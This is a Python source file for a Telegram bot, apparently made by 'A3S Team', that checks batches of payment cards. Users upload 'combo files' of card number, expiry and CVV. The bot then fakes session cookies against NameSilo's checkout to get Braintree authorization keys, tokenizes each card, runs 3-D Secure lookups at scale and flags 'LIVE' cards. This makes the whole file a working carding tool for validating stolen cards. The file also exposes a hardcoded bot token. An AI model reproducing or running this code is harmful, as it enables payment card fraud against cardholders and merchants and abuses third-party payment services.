#pylint:disable=W0603
#pylint:disable=W0611
import telebot
from telebot import types
import requests
import json
import base64
import time
from typing import Dict, List, Tuple
import threading
import uuid

TOKEN = "7458997340:AAHu4PAUsdJzjtMeL2Ba9qxZ4Xw2Q3EO-CA"
ADMIN_ID = 5895491379

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# تخزين البيانات
user_cards = {}
checking_status = {}

class BraintreeChecker:
    def __init__(self):
        self.cookies = {
            '_ga': f'GA1.1.{int(time.time())}.{int(time.time())}',
            '_fbp': f'fb.1.{int(time.time())}.{str(uuid.uuid4()).replace("-", "")[:16]}',
            'wasLoggedIn': '1',
            'device_1629404': str(uuid.uuid4()),
            'cookies-consent': 'necessary%3Ayes%2Cfunctional%3Ayes%2Canalytics%3Ayes%2Cperformance%3Ayes%2Cadvertisement%3Ayes%2Cuncategorised%3Ayes',
            'device_1630303': str(uuid.uuid4()),
            'device_1632436': str(uuid.uuid4()),
            '_cfuvid': f'{str(uuid.uuid4())[:8]}-1761062452747-0.0.1.1-604800000',
            '__cf_bm': f'{str(uuid.uuid4())[:8]}-{int(time.time())}',
            '_li_ns': '1',
            'device_1634092': str(uuid.uuid4()),
            '_gcl_au': f'1.1.{int(time.time())}.{int(time.time())}',
            'PHPSESSID': f'{str(uuid.uuid4())[:32]}',
            '_identity': f'%5B1634093%2C%22%22%2C1800%5D',
            'device_1634093': str(uuid.uuid4()),
            'cf_clearance': f'{str(uuid.uuid4())[:8]}-{int(time.time())}',
            'cfz_zaraz-analytics': f'%7B%22_cfa_clientId%22%3A%7B%22v%22%3A%22{str(uuid.uuid4())[:16]}%22%2C%22e%22%3A{int(time.time())+3600000}%7D%2C%22_cfa_sId%22%3A%7B%22v%22%3A%22{str(uuid.uuid4())[:16]}%22%2C%22e%22%3A{int(time.time())}%7D%7D',
            '_csrf': f'{str(uuid.uuid4())[:64]}',
            '_ga_5WDMLTHHFH': f'GS2.1.s{int(time.time())}$o7$g1$t{int(time.time())}$j60$l0$h{int(time.time())}',
        }
        self.auth_fingerprint = None
        
    def get_auth_keys(self) -> bool:
        try:
            headers = {
                'accept': 'application/json, text/plain, */*',
                'referer': 'https://www.namesilo.com/cart/checkout',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            response = requests.get(
                'https://www.namesilo.com/account/api/braintree/keys',
                cookies=self.cookies,
                headers=headers,
                timeout=30
            )
            
            if response.status_code == 200:
                text = response.text.strip().strip('"')
                decoded = base64.b64decode(text).decode('utf-8')
                data = json.loads(decoded)
                self.auth_fingerprint = data.get('authorizationFingerprint')
                return bool(self.auth_fingerprint)
            return False
        except:
            return False
    
    def tokenize_card(self, card: Dict) -> Tuple[str, Dict]:
        try:
            headers = {
                'accept': '*/*',
                'authorization': f'Bearer {self.auth_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': str(uuid.uuid4()),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         issuingBank         countryOfIssuance       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': card['number'],
                            'expirationMonth': card['month'],
                            'expirationYear': card['year'],
                            'cvv': card['cvv'],
                            'cardholderName': 'Card Holder',
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=headers,
                json=json_data,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and data['data'].get('tokenizeCreditCard'):
                    token_info = data['data']['tokenizeCreditCard']
                    return token_info.get('token'), token_info.get('creditCard', {})
            return None, {}
        except:
            return None, {}
    
    def check_3ds(self, token: str, bin_num: str) -> Dict:
        try:
            headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://www.namesilo.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            json_data = {
                'amount': 31.27,
                'additionalInfo': {
                    'billingLine1': '111 North Street',
                    'billingCity': 'Napoleon',
                    'billingState': 'State',
                    'billingPostalCode': '49261',
                    'billingCountryCode': 'EG',
                    'mobilePhoneNumber': '13609990000',
                },
                'bin': bin_num[:6],
                'dfReferenceId': str(uuid.uuid4()),
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.124.0',
                    'cardinalDeviceDataCollectionTimeElapsed': 346,
                    'issuerDeviceDataCollectionTimeElapsed': 3581,
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': self.auth_fingerprint,
                'braintreeLibraryVersion': 'braintree/web/3.124.0',
                '_meta': {
                    'merchantAppId': 'www.namesilo.com',
                    'platform': 'web',
                    'sdkVersion': '3.124.0',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': str(uuid.uuid4()),
                },
            }
            
            response = requests.post(
                f'https://api.braintreegateway.com/merchants/mfzfqnyzf9cs22b5/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
                headers=headers,
                json=json_data,
                timeout=30
            )
            
            if response.status_code in [200, 201]:
                data = response.json()
                return data
            return {'error': 'Lookup Error'}
        except:
            return {'error': 'Lookup Error'}
    
    def analyze_result(self, result_data: Dict, card_info: Dict) -> Dict:
        if 'error' in result_data and result_data['error'] == 'Lookup Error':
            return {
                'status': 'ERROR',
                'message': 'Lookup Error',
                'details': {}
            }
        
        if not result_data or 'paymentMethod' not in result_data:
            return {
                'status': 'ERROR',
                'message': 'Connection Failed',
                'details': {}
            }
        
        three_ds = result_data.get('paymentMethod', {}).get('threeDSecureInfo', {})
        lookup = result_data.get('lookup', {})
        
        status = three_ds.get('status', '').lower()
        liability = three_ds.get('liabilityShifted', False)
        acs_url = lookup.get('acsUrl')
        enrolled = three_ds.get('enrolled', 'U')
        
        bank = card_info.get('binData', {}).get('issuingBank', 'Unknown Bank')
        country = card_info.get('binData', {}).get('countryOfIssuance', 'XX')
        card_type = card_info.get('brandCode', 'Unknown')
        bin_code = card_info.get('bin', 'N/A')
        
        country_emoji = {
            'USA': '🇺🇸', 'ITA': '🇮🇹', 'GBR': '🇬🇧', 'CAN': '🇨🇦', 
            'FRA': '🇫🇷', 'DEU': '🇩🇪', 'ESP': '🇪🇸', 'BRA': '🇧🇷',
            'MEX': '🇲🇽', 'IND': '🇮🇳', 'CHN': '🇨🇳', 'JPN': '🇯🇵',
            'AUS': '🇦🇺', 'NLD': '🇳🇱', 'BEL': '🇧🇪', 'CHE': '🇨🇭',
            'SWE': '🇸🇪', 'NOR': '🇳🇴', 'DNK': '🇩🇰', 'FIN': '🇫🇮',
            'POL': '🇵🇱', 'RUS': '🇷🇺', 'TUR': '🇹🇷', 'EGY': '🇪🇬',
            'SAU': '🇸🇦', 'ARE': '🇦🇪', 'QAT': '🇶🇦', 'KWT': '🇰🇼'
        }
        
        emoji = country_emoji.get(country, '🏳️')
        
        details = {
            'bank': bank,
            'country': country,
            'emoji': emoji,
            'type': card_type,
            'bin': bin_code,
            'status_3ds': status,
            'liability': liability,
            'enrolled': enrolled
        }
        
        if status in ['authenticate_successful', 'authenticate_attempt_successful'] and liability:
            return {
                'status': 'LIVE',
                'message': '✅ Charged Successfully',
                'details': details
            }
        
        if acs_url and enrolled == 'Y' and status in ['authentication_unavailable', 'lookup_complete']:
            return {
                'status': 'OTP',
                'message': '🔐 OTP Required',
                'details': details
            }
        
        if status in ['authenticate_rejected', 'failed', 'unavailable']:
            return {
                'status': 'DECLINED',
                'message': '❌ Declined',
                'details': details
            }
        
        if 'bypass' in status or enrolled == 'N':
            return {
                'status': 'APPROVED',
                'message': '✓ Approved (No 3DS)',
                'details': details
            }
        
        if status == 'authenticate_attempt_successful' and not liability:
            return {
                'status': 'APPROVED',
                'message': '✓ Approved (No CVV)',
                'details': details
            }
        
        return {
            'status': 'ERROR',
            'message': f'❔ Unknown Status: {status}',
            'details': details
        }
    
    def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
        time.sleep(1.5)
        
        start_time = time.time()
        token, card_info = self.tokenize_card(card)
        
        if not token:
            if retry_count < 2:
                time.sleep(2)
                if self.get_auth_keys():
                    return self.check_card(card, retry_count + 1)
            
            return {
                'status': 'ERROR',
                'message': 'Tokenization Failed',
                'details': {},
                'time': round(time.time() - start_time, 2)
            }
        
        result = self.check_3ds(token, card['number'])
        result_data = self.analyze_result(result, card_info)
        result_data['time'] = round(time.time() - start_time, 2)
        
        return result_data

# Bot Handlers
@bot.message_handler(commands=['start'])
def start_message(message):
    username = message.from_user.first_name or "User"
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 Braintree 3DS Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results  
🔒 Secure Processing
💳 Only LIVE Cards Sent

📤 Send your combo file to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8").splitlines()
        
        cards = []
        for line in lines:
            line = line.strip()
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cards.append({
                        'number': parts[0].strip(),
                        'month': parts[1].strip().zfill(2),
                        'year': parts[2].strip(),
                        'cvv': parts[3].strip(),
                        'raw': line
                    })
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file!")
            return
        
        user_cards[user_id] = cards
        checking_status[user_id] = False
        
        cc_count = len(cards)
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: Braintree 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    
    if user_id not in user_cards or not user_cards[user_id]:
        bot.answer_callback_query(call.id, "❌ No cards loaded!")
        return
    
    if checking_status.get(user_id, False):
        bot.answer_callback_query(call.id, "⚠️ Already checking!")
        return
    
    checking_status[user_id] = True
    bot.answer_callback_query(call.id, "✅ Starting check...")
    
    thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
    thread.start()

def check_cards_thread(user_id, message):
    cards = user_cards[user_id]
    total = len(cards)
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="⏳ Initializing checker...\n🔑 Getting authorization keys..."
    )
    
    checker = BraintreeChecker()
    if not checker.get_auth_keys():
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text="❌ Failed to get authorization keys!\nPlease update cookies."
        )
        checking_status[user_id] = False
        return
    
    live = approved = otp = declined = errors = checked = 0
    start_time = time.time()
    lookup_error_count = 0
    
    for card in cards:
        if not checking_status.get(user_id, True):
            break
        
        while checking_status.get(user_id, True):
            result = checker.check_card(card)
            
            if result['message'] == 'Lookup Error':
                lookup_error_count += 1
                errors += 1
                if lookup_error_count >= 120:
                    checking_status[user_id] = False
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=message.message_id,
                        text=f"""<b>⚠️ Max Lookup Errors Reached!
━━━━━━━━━━━━━━━━━━━━
⏳ Checking stopped after 120 lookup errors.
📝 Please try again later.
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
                    )
                    return
                bot.send_message(user_id, "⚠️ Lookup Error Detected! Waiting 1 minute...")
                time.sleep(60)
                checker.__init__()  # Refresh session cookies
                if not checker.get_auth_keys():
                    bot.send_message(user_id, "⚠️ Failed to refresh keys! Waiting another minute...")
                    time.sleep(60)
                    checker.__init__()
                    if not checker.get_auth_keys():
                        checking_status[user_id] = False
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=message.message_id,
                            text="❌ Failed to refresh keys twice! Stopping check."
                        )
                        return
                # Retry same card
            else:
                checked += 1
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                status_3ds = result.get('details', {}).get('status_3ds', 'Unknown')
                callback_data = f"show_result_{checked}"
                keyboard.add(
                    types.InlineKeyboardButton(f"📋|Status: {status_3ds}", callback_data=callback_data)
                )
                keyboard.add(
                    types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Approved ✓ ➜ [{approved}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
                    types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
                )
                
                if result['status'] == 'LIVE':
                    live += 1
                    details = result['details']
                    msg = f"""<b>✅ LIVE CARD
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result['message']}
⏱ Time: {result['time']} sec

🏦 BIN Info:
├ BIN: <code>{details['bin']}</code>
├ Type: {details['type']}
├ Bank: {details['bank']}
└ Country: {details['country']} {details['emoji']}

🔒 3DS Info:
├ Status: {details['status_3ds']}
├ Liability: {'✅ Shifted' if details['liability'] else '❌ Not Shifted'}
└ Enrolled: {details['enrolled']}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
                    bot.send_message(user_id, msg)
                elif result['status'] == 'APPROVED':
                    approved += 1
                elif result['status'] == 'OTP':
                    otp += 1
                elif result['status'] == 'DECLINED':
                    declined += 1
                else:
                    errors += 1
                
                user_cards[user_id][checked-1]['result'] = result
                
                progress = int((checked / total) * 20)
                progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
                elapsed = time.time() - start_time
                speed = checked / elapsed if elapsed > 0 else 0
                eta = (total - checked) / speed if speed > 0 else 0
                
                try:
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=message.message_id,
                        text=f"""<b>🔥 Gateway: Braintree 3DS
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
💳 Current: {card['number'][:6]}...{card['number'][-4:]}
</b>""",
                        reply_markup=keyboard
                    )
                except:
                    pass
                
                time.sleep(0.5)
                break  # Move to next card
    
    total_time = time.time() - start_time
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text=f"""<b>✅ CHECKING COMPLETED!
━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
├ Total Cards: {total}
├ LIVE ✅: {live}
├ Approved ✓: {approved}
├ OTP 🔐: {otp}
├ Declined ❌: {declined}
├ Errors ⚠️: {errors}

⏱ Stats:
├ Time: {int(total_time)}s
└ Speed: {(total/total_time):.2f} cards/sec
━━━━━━━━━━━━━━━━━━━━
🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    )
    
    checking_status[user_id] = False
    del user_cards[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith('show_result_'))
def show_card_result(call):
    user_id = call.from_user.id
    index = int(call.data.split('_')[-1]) - 1
    
    if user_id not in user_cards or index >= len(user_cards[user_id]):
        bot.answer_callback_query(call.id, "❌ No result found!")
        return
    
    card = user_cards[user_id][index]
    result = card.get('result', {})
    details = result.get('details', {})
    
    msg = f"""<b>{result.get('message', '❔ Unknown Status')}
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result.get('message', 'Unknown')}
⏱ Time: {result.get('time', 0)} sec"""
    
    if details:
        msg += f"""
🏦 BIN Info:
├ BIN: <code>{details.get('bin', 'N/A')}</code>
├ Type: {details.get('type', 'Unknown')}
├ Bank: {details.get('bank', 'Unknown Bank')}
└ Country: {details.get('country', 'XX')} {details.get('emoji', '🏳️')}

🔒 3DS Info:
├ Status: {details.get('status_3ds', 'N/A')}
├ Liability: {'✅ Shifted' if details.get('liability', False) else '❌ Not Shifted'}
└ Enrolled: {details.get('enrolled', 'U')}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    
    bot.send_message(user_id, msg)
    bot.answer_callback_query(call.id, "📋 Result displayed!")

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    user_id = call.from_user.id
    checking_status[user_id] = False
    bot.answer_callback_query(call.id, "✅ Checking stopped!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:
━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this message
/status - Check bot status

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Only LIVE cards sent, others via button

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE
━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: Braintree 3DS
🔥 Speed: Ultra Fast
✅ Accuracy: High
🌍 Server: Active
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, status_text)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    text = message.text.strip()
    if '|' in text and len(text.split('|')) == 4:
        parts = text.split('|')
        user_cards[message.from_user.id] = [{
            'number': parts[0].strip(),
            'month': parts[1].strip().zfill(2),
            'year': parts[2].strip(),
            'cvv': parts[3].strip(),
            'raw': text
        }]
        checking_status[message.from_user.id] = False
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
🔥 Gateway: Braintree 3DS
⚡ Status: Ready
</b>""",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!
Use: Card|MM|YYYY|CVV
Example: 5127740080852575|03|2027|825
</b>""")

if __name__ == "__main__":
    print("🚀 Starting Braintree Checker Bot...")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print("✅ Bot is running...\n")
    bot.polling(none_stop=True)
